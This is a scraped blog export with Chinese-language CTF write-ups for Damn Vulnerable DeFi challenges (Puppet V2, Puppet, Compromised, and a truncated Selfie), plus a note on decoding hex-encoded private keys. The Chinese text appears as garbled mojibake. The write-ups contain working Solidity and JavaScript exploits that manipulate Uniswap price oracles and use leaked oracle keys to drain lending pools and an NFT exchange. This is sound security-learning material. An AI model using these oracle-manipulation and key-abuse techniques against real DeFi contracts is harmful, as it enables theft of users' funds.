uniswapv2ä¸­è¿˜æœ‰å‚¨å¤‡é‡ 3. quoteçš„è®¡ç®—æºç ï¼š `amountA.mul(reserveB) / reserveA;` 3.1 ä»£å…¥æœ¬é¢˜ï¼šamount.mul(10 ** 18).mul(reservesWETH) / reservesToken 3.2 åŒ–ç®€ï¼šamount * 10 ^ 18 * reservesWETH / reservesToken */ return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH); &#125;&#125; ç®€å•çš„åˆ†æï¼Œå‘ç°å’Œä¸Šä¸€é¢˜å¤§å·®ä¸å·®ã€‚ æŠ¼é‡‘ = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken å…¶ä¸­çš„æŠ¼é‡‘æ˜¯ç”± reservesWETH å’Œ reservesToken å†³å®šçš„ï¼Œè¦ä¹ˆæ”¹å˜ reservesWETH è¦ä¹ˆ æ”¹å˜ reservesTokenï¼Œæœ¬é¢˜æ˜¯æ”¹å˜ reservesWETH ã€‚ é¢˜ä¸­å·²ç»ç»™æˆ‘ä»¬çš„ token å’Œ wethäº¤æ˜“å¯¹æ³¨å…¥ä¸€å®šçš„é‡‘é¢äº† 12const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n; æˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯å°† UNISWAP_INITIAL_WETH_RESERVEçš„å€¼å°½å¯èƒ½çš„å˜å°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡UniswapV2Router02åˆçº¦çš„ swapExactTokensForETHå‡½æ•°ï¼Œå°†playerå…¨éƒ¨çš„tokenåœ¨ äº¤æ˜“å¯¹ä¸­å°½å¯èƒ½çš„å…‘æ¢å¤šçš„WETHå‡ºæ¥ï¼Œä»è€Œé™ä½æˆ‘ä»¬çš„æŠ¼é‡‘ã€‚ è§£é¢˜æ€è·¯ï¼š å…ˆé€šè¿‡ UniswapV2Router02 ä¸­çš„ swapExactTokensForETHæ¶ˆè€—è°ƒ uniswapExchangeä¸­çš„ WETH è°ƒç”¨borrowå‡½æ•° å°†hackerä¸­çš„tokensè½¬å›player 3. solving3.1 PuppetV2Hack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &#x27;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#123;PuppetV2Pool&#125; from &quot;./PuppetV2Pool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;/** è§£é¢˜æ€è·¯ï¼š 1. å…ˆé€šè¿‡ UniswapV2Router02 ä¸­çš„ `swapExactTokensForETH`æ¶ˆè€—è°ƒ uniswapExchangeä¸­çš„ WETH 1.1 playerç»™hackerè½¬å…¥tokens 1.2 hackerç»™uniswapRouteræˆæƒ ---&gt; safeTransferFrom 1.3 æ ¹æ®tokenå’Œwethåˆ›å»ºä¸€ä¸ªæ•°ç»„ 2. è°ƒç”¨borrowå‡½æ•° 2.1 å°†playerçš„ETHè½¬å‘ç»™hacker 2.2 è®©hackerç»™poolæˆæƒï¼Œä»¥æ­¤è°ƒç”¨poolä¸­çš„ transferFrom 2.3 è°ƒç”¨borrowå‡½æ•° 2.4 å°†tokensè½¬ç§»åˆ°player */contract PuppetV2Hack &#123; IUniswapV2Router02 uniswapRouter; IERC20 token; PuppetV2Pool pool; IERC20 weth; address player; constructor( address _uniswapRouter, address _token, address _pool, address _weth) public &#123; uniswapRouter = IUniswapV2Router02(_uniswapRouter); token = IERC20(_token); pool = PuppetV2Pool(_pool); weth = IERC20(_weth); player = msg.sender; &#125; function attack() external payable &#123; // è·å–playerçš„tokenæ•°é‡ uint256 tokenAmount = token.balanceOf(address(this)); token.approve(address(uniswapRouter), tokenAmount); // åˆ›å»ºæ•°ç»„ address[] memory path = new address[](2); path[0] = address(token); path[1] = address(weth); uniswapRouter.swapExactTokensForETH( tokenAmount, 1, path, address(this), uint256(block.timestamp + 150) ); // ETH è½¬ WETH weth.deposit&#123;value: address(this).balance&#125;(); // hackerç»™poolæˆæƒ weth.approve(address(pool), weth.balanceOf(address(this))); // è°ƒç”¨borrowå‡½æ•° pool.borrow(token.balanceOf(address(pool))); // å°†tokenè½¬ç»™token token.transfer(player, token.balanceOf(address(this))); &#125; // æ¶‰åŠåˆ°è½¬ETHçš„å¿…é¡»éœ€è¦æœ‰è¿™ä¸ªæ¥æ”¶å‡½æ•° receive() external payable &#123;&#125;&#125; 3.2 challenge.js123456789it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetV2Hack&#x27;, player)).deploy( uniswapRouter.address, token.address, lendingPool.address, weth.address ); await (await token.connect(player)).transfer(hacker.address, PLAYER_INITIAL_TOKEN_BALANCE); // è¿™é‡Œå‡æ‰ 0.1etheræ˜¯ä¸ºäº†ä¿è¯äº¤æ˜“æ­£å¸¸è¿›è¡Œï¼Œæ”¯ä»˜äº¤æ˜“æ‰€éœ€çš„gas await hacker.attack(&#123;value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n&#125;); &#125;); ![image-20230721232602837](Puppet V2&#x2F;image-20230721232602837.png) è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Puppet","slug":"CTFS/damn defi/Puppet","date":"2023-07-13T11:37:10.000Z","updated":"2023-07-13T11:37:10.000Z","comments":true,"path":"2023/07/13/CTFS/damn defi/Puppet/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/CTFS/damn%20defi/Puppet/","excerpt":"","text":"1. issue Thereâ€™s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity. Thereâ€™s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity. Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance. ç®€å•æ¥è¯´ï¼Œå‡­å€Ÿæ‰‹ä¸­ 25 ETH and 1000 DVTsï¼Œå°† lending poolä¸­çš„ DVTS ä»£å¸å…¨éƒ¨å–å‡ºæ¥ã€‚ é¢˜ç›®é“¾æ¥ 2. analysing2.1 PuppetPool.solè¿™é“é¢˜åªæœ‰ä¸€ä¸ªåˆçº¦ï¼Œæˆ‘ä»¬å…ˆé˜…è¯»åˆçº¦ã€‚ é‡Œé¢åªæœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œ åˆ†åˆ«æ˜¯ï¼š borrowã€calculateDepositRequiredã€_computeOraclePrice borrow 123456789101112131415161718192021222324function borrow(uint256 amount, address recipient) external payable nonReentrant &#123; uint256 depositRequired = calculateDepositRequired(amount); // æŠ¼é‡‘ ï¼ˆDVT) if (msg.value &lt; depositRequired) revert NotEnoughCollateral(); if (msg.value &gt; depositRequired) &#123; // æ”¯ä»˜çš„ETH è¦å¤§äºæŠ¼é‡‘ unchecked &#123; payable(msg.sender).sendValue(msg.value - depositRequired); &#125; &#125; unchecked &#123; deposits[msg.sender] += depositRequired; &#125; // Fails if the pool doesn&#x27;t have enough tokens in liquidity if(!token.transfer(recipient, amount)) revert TransferFailed(); emit Borrowed(msg.sender, recipient, depositRequired, amount); &#125; å‡½æ•°å¾ˆç®€å•ï¼Œå°±æ˜¯ åˆ¤æ–­ä½ æ”¯ä»˜çš„ETH è¦å¤§äºæŠ¼é‡‘ï¼Œè€Œä¸”è¿˜æœ‰ç¡®ä¿ poolä¸­æœ‰è¶³å¤Ÿçš„ DVTså¯ä¾›å€Ÿè´· if(!token.transfer(recipient, amount))ã€‚ calculateDepositRequiredã€_computeOraclePrice è¿™ä¸¤ä¸ªå‡½æ•°ä¸€å—çœ‹ 1234567891011// è®¡ç®—æŠ¼é‡‘ åŒ–ç®€å¾— 2 * amount * uniswapPair.balance / token.balanceOf(uniswapPair) function (uint256 amount) public view returns (uint256) &#123; return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18; &#125; // è®¡ç®—æ¯ä¸€ä¸ª token å¯¹åº”å¤šå°‘ wei function _computeOraclePrice() private view returns (uint256) &#123; // calculates the price of the token in wei according to Uniswap pair return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair); &#125; å°†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨æ•°å­¦ä»£æ¢å¼å¯ä»¥å°† calculateDepositRequiredçš„è®¡ç®—å¼çœ‹æˆ depositRequired = 2 * uniswapPair.balance / token.balanceOf(uniswapPair) æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œè¦æƒ³å•†æœ€å°ï¼Œè¦ä¹ˆè¢«é™¤æ•°è¶Šå°ï¼Œè¦ä¹ˆé™¤æ•°è¶Šå¤§ã€‚ è€Œé¢˜ä¸­ uniswapPair.balance å’Œ token.balanceOf(uniswapPair)éƒ½æ˜¯ 10 ã€‚é¢˜ç›®è¿˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ª uniswap v1æˆ‘ æ‰‹ä¸­æœ‰ 25 ETH and 1000 DVTsï¼Œæˆ‘å¯ä»¥è¯•ç€å’Œ uniswapè¿›è¡Œäº¤æ¢ï¼Œä»è€Œçœ‹çœ‹å¦‚ä½•æ”¹å˜uniswap çš„ uniswapPair.balance æˆ– token.balanceOf(uniswapPair)ã€‚ æœ‰ä¸€ç¯‡ æ–‡ç« èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬è°ƒç”¨ uniswap v1çš„å‡½æ•°ï¼Œæ¯”å¦‚ tokenToEthSwapOutputï¼Œå‡½æ•°åŠŸèƒ½ï¼šæŒ‡å®šä½ éœ€è¦å…‘æ¢çš„ ETHæ•°é‡å¹¶å°†ETHå‘é€ç»™æŒ‡å®šæ¥æ”¶è€…ï¼Œå‡½æ•°æ ¹æ®è¦å…‘æ¢çš„ETHè®¡ç®—æ‰£é™¤ä»£å¸ã€‚ å¤§ä½¬çš„åšå®¢ 3. solving3.1 PuppetHack.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableToken.sol&quot;;import &quot;./PuppetPool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IUniswapExchange &#123; function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) external returns (uint256);&#125;contract PuppetHack &#123; DamnValuableToken token; IUniswapExchange uniswapExchange; PuppetPool pool; constructor(address _token, address _uniswapExchange, address _pool) &#123; token = DamnValuableToken(_token); uniswapExchange = IUniswapExchange(_uniswapExchange); pool = PuppetPool(_pool); &#125; function attack() external payable &#123; // console.log(&quot;msg.sender.balance&quot;,msg.sender.balance); // payable(address(this)).transfer(msg.sender.balance); // è®°å½•æˆ‘æ‰‹ä¸­çš„ä»£å¸æ•°é‡ uint256 amount = token.balanceOf(address(this)); // å…ˆç»™uniswapv1æˆæƒï¼Œå…è®¸å®ƒè°ƒç”¨æˆ‘ä»¬å…¨éƒ¨çš„tokenï¼Œæ­¤æ—¶æˆæƒè€…æ˜¯hacker token.approve(address(uniswapExchange), amount); // è°ƒç”¨v1ï¼Œç”¨ä»£å¸äº¤æ¢ETH uniswapExchange.tokenToEthSwapOutput(9.9 ether, amount, block.timestamp * 2); // ç®—ä¸€ä¸‹ç°åœ¨æŠŠ poolä¸­çš„tokenå…¨éƒ¨å€Ÿå‡ºæ¥è¦æŠµæŠ¼å¤šå°‘ ETH uint256 depositRequired = pool.calculateDepositRequired(token.balanceOf(address(pool))); // å°†å…¨éƒ¨çš„ tokenä»£å¸å€Ÿå‡ºæ¥ pool.borrow&#123;value: depositRequired, gas: 30000000&#125;(token.balanceOf(address(pool)), msg.sender); &#125; // æ¥æ”¶ v1 æ¢å‡ºæ¥çš„ ETH receive() external payable &#123;&#125;&#125; 3.2 challenge.js1234567891011121314it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetHack&#x27;, player)).deploy( token.address, uniswapExchange.address, lendingPool.address); await token.connect(player).transfer(hacker.address, await token.balanceOf(player.address)); await player.sendTransaction(&#123; to: hacker.address, value: await ethers.utils.parseEther(&quot;11.0&quot;) &#125;); await hacker.attack(); &#125;); è¦åœ¨ä¸€ç¬”äº¤æ˜“ä¸­å®Œæˆã€‚ã€‚ã€‚ã€‚ã€‚ã€‚(æŠŠé¢˜ç›®æ”¹äº†å°±èˆ’æœå¤šäº†) å…ˆç•™ç€å§ï¼Œç­‰ä»¥åæŠ€æœ¯ä¸Šæ¥äº†ï¼Œå†è¯•ç€æŠŠä»–ä»¬æ•´åˆåˆ°ä¸€ç¬”äº¤æ˜“ä¸­ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"From ASCII To  PrivateKey","slug":"Utils/Solidity/ASCIIè½¬ç§é’¥","date":"2023-07-13T04:47:10.000Z","updated":"2023-07-13T04:47:10.000Z","comments":true,"path":"2023/07/13/Utils/Solidity/ASCIIè½¬ç§é’¥/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/Utils/Solidity/ASCII%E8%BD%AC%E7%A7%81%E9%92%A5/","excerpt":"","text":"1. å‰è¨€ä¸»è¦æ˜¯åœ¨ é¶åœº åˆ·é¢˜çš„æ—¶å€™é‡åˆ°çš„ï¼Œé¢˜ç›®è¦æ±‚ å°†ä¸€ä¸²ASCIIç è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå†å°†å­—ç¬¦ä¸²è§£ç ä¸ºä¸€ä¸²ç§é’¥ã€‚æ„Ÿè§‰å¾ˆæœ‰è¶£ï¼Œäºæ˜¯ä¹ï¼Œä¾¿è®°å½•ä¸‹æ¥ã€‚ 2. é¢˜ç›®ä¸€ä¸²å·²çŸ¥çš„ASCIIç  14d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 3. è§£æ³•ï¼ˆJavaScriptï¼‰ æ€è·¯ï¼š å°†å…¶çœ‹ä½œå­—ç¬¦ä¸²ï¼Œå°†å­—ç¬¦ä¸²ä»¥ç©ºæ ¼ä¸ºç•Œé™åˆ†å‰²ä¸ºæ•°ç»„ï¼Œéå†æ•°ç»„ï¼Œå°†æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ æ‹¼æ¥ä¸€ä¸ª 0xä¸ºäº†å°†å…¶è½¬ä¸ºæ•´å‹çš„æ—¶å€™ä»£è¡¨ç€ 16è¿›åˆ¶ã€‚æœ€åå°†æ•°ç»„æŒ¨ä¸ªéå†è½¬åŒ–æ‹¼æ¥ã€‚ å®ç°ä»£ç  12345678910let code = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;;let chars = code.split(&quot; &quot;)let result = &quot;&quot;;for (let i = 0; i &lt; chars.length; i++) &#123; chars[i] = &quot;0x&quot; + chars[i]; chars[i] = String.fromCharCode(parseInt(chars[i])); result += chars[i];&#125;result = atob(result);console.log(result);","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"}],"tags":[{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"}]},{"title":"Compromised","slug":"CTFS/damn defi/Compromised","date":"2023-07-13T03:37:10.000Z","updated":"2023-07-13T03:37:10.000Z","comments":true,"path":"2023/07/13/CTFS/damn defi/Compromised/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/CTFS/damn%20defi/Compromised/","excerpt":"","text":"1. issue While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Hereâ€™s a snippet: 123456789HTTP/2 200 OKcontent-type: text/htmlcontent-language: envary: Accept-Encodingserver: cloudflare4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 354d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 A related on-chain exchange is selling (absurdly overpriced) collectibles called â€œDVNFTâ€, now at 999 ETH each. This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c. Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange. ç›®æ ‡ï¼šä½¿ç”¨ä½ æ‰‹ä¸­çš„ 0.1 ether å»æç©º äº¤æ˜“æ‰€ä¸­çš„ æ‰€æœ‰ETH é¢˜ç›®é“¾æ¥ 2. analysing2.1 understanding of meé€šè¯»æ•´ä¸ªä»£ç ä¹‹åï¼Œç†è§£äº†é¢„è¨€æœºåŠäº¤æ˜“æ‰€çš„å·¥ä½œåŸç†ã€‚æˆ‘èƒ½æƒ³åˆ°çš„å°±æ˜¯é€šè¿‡ postPriceä¿®æ”¹è´§å¸çš„ä»·æ ¼ï¼Œä½¿å…¶å”®ä»·ä½äºæˆ‘ä»¬æ‰‹ä¸­çš„ä½™é¢ 0.1 ETHã€‚ä½†æ˜¯ï¼Œæˆä¸º TRUSTED_SOURCE_ROLEæˆä¸ºäº†éš¾ç‚¹ã€‚ 1234// ä¿®æ”¹ msg.sender è‡ªå·±çš„è´§å¸ä»·æ ¼ function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) &#123; _setPrice(msg.sender, symbol, newPrice);&#125; è¿˜æœ‰ä¸€ä¸ªä¿®æ”¹å”®ä»·çš„å‡½æ•° setupInitialPricesï¼Œä½†æ˜¯ä»–çš„æƒé™åœ¨ INITIALIZER_ROLEä»–æ‰‹é‡Œï¼Œè€Œæ‹¥æœ‰è¿™ä¸ªæƒåŠ›çš„äººåªæœ‰éƒ¨ç½²è€…æœ‰ï¼Œå°±æœ¬é¢˜æ¥è¯´ æ‹¥æœ‰è¯¥æƒåŠ›çš„æ˜¯ deployer è€Œæˆ‘ä»¬ä½œä¸º playeræˆ‘ä»¬å¿…ç„¶æ²¡æœ‰æƒåŠ›å»è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚åˆ°æ­¤æˆ‘å°±å¼€å§‹é™·å…¥è¿·èŒ«äº†ã€‚ã€‚ã€‚ã€‚ã€‚è¦ä¹ˆç­‰ deployer ä¿®æ”¹ä»·æ ¼ï¼Œè¦ä¹ˆç­‰ å–å®¶è‡ªå·±é™ä»·ã€‚ 123456789101112131415function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices) external onlyRole(INITIALIZER_ROLE)&#123; // Only allow one (symbol, price) per source require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length); // ç¡®ä¿æ¯ä¸ªåœ°å€å¯¹åº”ä¸€ç§è´§å¸ for (uint256 i = 0; i &lt; sources.length;) &#123; unchecked &#123; _setPrice(sources[i], symbols[i], prices[i]); // ç»™ sources[i] =&gt; symbols[i] è®¾ç½®ä¸€ä¸ªæ–°çš„ä»·æ ¼ prices[i] ++i; &#125; &#125; renounceRole(INITIALIZER_ROLE, msg.sender); // æ‰§è¡Œå®Œ åˆå§‹åŒ–ä»·æ ¼æ“ä½œä¹‹åï¼Œå°†å›æ”¶è°ƒç”¨è€…çš„ INITIALIZER_ROLE è§’è‰²æƒåŠ›&#125; 2.2 search for helpæœ€åè¿˜æ˜¯å»ç½‘ä¸Šæœäº† é¢˜è§£ çœ‹å®Œä¹‹åæˆ‘åªèƒ½è¯´ï¼Œç‰›çš„ã€‚ã€‚ã€‚ã€‚ç¡®å®æ²¡æ³¨æ„å®¡é¢˜ï¼Œä½†æ˜¯è°çŸ¥é“é¢˜ç›®ç»™çš„ä¿¡æ¯å¯ä»¥è½¬ä¸º EOAè´¦æˆ·çš„ç§é’¥å“‡ğŸ˜… è½¬æ¢é“¾æ¥ æˆ‘å°† è½¬æ¢å‡ºæ¥çš„ä¸¤ä¸ªç§é’¥é€šè¿‡ ä¸€äº› æ‰‹æ®µ è½¬æˆåœ°å€ï¼Œå‘ç°å’Œé¢˜ç›®ä¸­çš„åä¸¤ä¸ªåœ°å€ä¸€æ ·ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å†’å…… &#39;0xe92401A4d3af5E446d93D11EEc806b1462b39D15&#39; &#39;0x81A5D6E50C214044bE44cA0CB057fe119097850c&#39; ã€‚ äºæ˜¯å°±æœ‰äº†è§£é¢˜æ€è·¯ï¼š å…ˆå°†é¢˜ç›®ç»™çš„ä¿¡æ¯è½¬æˆç§é’¥ å†’å……å–å®¶ï¼Œé€šè¿‡ postPriceå‡½æ•°å°†è‡ªå·±è´§å¸ä»·æ ¼æ”¹å¾—å¾ˆä½ ç©å®¶playerç«‹å³ä½ä»·è´­ä¹° å†’å……å–å®¶ï¼Œé€šè¿‡ postPriceå‡½æ•°å°†è‡ªå·±è´§å¸ä»·æ ¼æ”¹ä¸ºäº¤æ˜“æ‰€ç°æœ‰ETHæ•°ç›®çš„ä»·æ ¼ ç©å®¶playerå‡ºå”®è‡ªå·±è´­ä¹°çš„è´§å¸ å†’å……å–å®¶ï¼Œé€šè¿‡ postPriceå‡½æ•°å°†è‡ªå·±è´§å¸ä»·æ ¼æ”¹ä¸º EXCHANGE_INITIAL_ETH_BALANCE 3. solving3.1 challenge.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let code1 = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;; let code2 = &quot;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&quot;; let chars1= code1.split(&quot; &quot;); let chars2 = code2.split(&quot; &quot;); let privateKey2 = &quot;&quot;; let privateKey3 = &quot;&quot;; for (let i = 0; i &lt; chars1.length; i++) &#123; chars1[i] = &quot;0x&quot; + chars1[i]; chars1[i] = String.fromCharCode(parseInt(chars1[i])); privateKey2 += chars1[i]; &#125; for (let i = 0; i &lt; chars2.length; i++) &#123; chars2[i] = &quot;0x&quot; + chars2[i]; chars2[i] = String.fromCharCode(parseInt(chars2[i])); privateKey3 += chars2[i]; &#125; privateKey2 = atob(privateKey2); privateKey3 = atob(privateKey3); let accountWallet2 = new ethers.Wallet(privateKey2, ethers.provider); let accountWallet3 = new ethers.Wallet(privateKey3, ethers.provider); // ä¿®æ”¹oracleçš„msg.sender,åˆ†åˆ«å°†å„è‡ªçš„è´§å¸ä»·æ ¼è®¾ç½®ä¸º 1wei await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;, 1) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;, 1) await exchange.connect(player).buyOne(&#123; value: 1, &#125;); // äº¤æ˜“æ‰€ä¸­ç°æœ‰çš„ ETH const newPrice = await ethers.provider.getBalance(exchange.address) // ä¿®æ”¹oracleçš„msg.sender,åˆ†åˆ«å°†å„è‡ªçš„è´§å¸ä»·æ ¼è®¾ç½®ä¸º newPrice await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,newPrice) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,newPrice) /** * approve æ“ä½œä¸ºäº†æˆåŠŸæ‰§è¡Œ `token.transferFrom(msg.sender, address(this), id)` å…è®¸ exchange.addresså¯ä»¥è°ƒç”¨ playerçš„é’±ã€ è‡³äºä¸ºä»€ä¹ˆæ˜¯ `0`å·ä»£å¸ï¼Œæ˜¯å› ä¸ºåœ¨DamnValuableNFTä¸­ &#x27;DVNFT&#x27; æ˜¯å”¯ä¸€ä¸€ç§ id æ˜¯æ ¹æ® ` function safeMint(address to) public onlyRoles(MINTER_ROLE) returns (uint256 tokenId)`æ±‚çš„ */ await nftToken.connect(player).approve(exchange.address, 0) await exchange.connect(player).sellOne(0); // å°†å”®ä»·æ”¹å› EXCHANGE_INITIAL_ETH_BALANCE await oracle.connect(accountWallet2).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) await oracle.connect(accountWallet3).postPrice(&#x27;DVNFT&#x27;,EXCHANGE_INITIAL_ETH_BALANCE) &#125;); æœ¬é¢˜ç»™æˆ‘çš„å¯å‘ï¼šç§é’¥å¾ˆé‡è¦ï¼Œä¸€å®šè¦å¥½å¥½ä¿ç®¡è‡ªå·±çš„ç§é’¥ã€‚è¿˜æœ‰åšé¢˜çš„æ—¶å€™ä¸€å®šè¦å¥½å¥½çœ‹é¢˜å†å¼€å§‹åšé¢˜ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Selfie","slug":"CTFS/damn defi/Selfie","date":"2023-07-12T02:37:10.000Z","updated":"2023-07-12T02:37:10.000Z","comments":true,"path":"2023/07/12/CTFS/damn defi/Selfie/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/12/CTFS/damn%20defi/Selfie/","excerpt":"","text":"1. issue A new cool lending pool has launched! Itâ€™s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it. What could go wrong, right ? You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all. ç›®æ ‡ï¼šå°† A new cool lending poolçš„é’±å…¨å–å‡ºæ¥ã€‚ é¢˜ç›®é“¾æ¥ 2. analysing2.1 SelfPool.solflashLoan 123456789101112131415161718192021222324function flashLoan( IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) &#123; // ä¿è¯ _token ä¸ºè¯¥åˆçº¦çš„ERC20Snapshotåœ°å€ if (_token != address(token)) revert UnsupportedCurrency(); // é‡‘åº“ å‘å€Ÿè´·è€…è½¬è´¦ token.transfer(address(_receiver), _amount); // _receiver éœ€è¦å…·å¤‡æ¢è´·åŠŸèƒ½ï¼Œä¸”è¿”å›å€¼å¿…é¡»æ˜¯ CALLBACK_SUCCESS // æ­¤æ—¶ msg.sender = hacker if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert 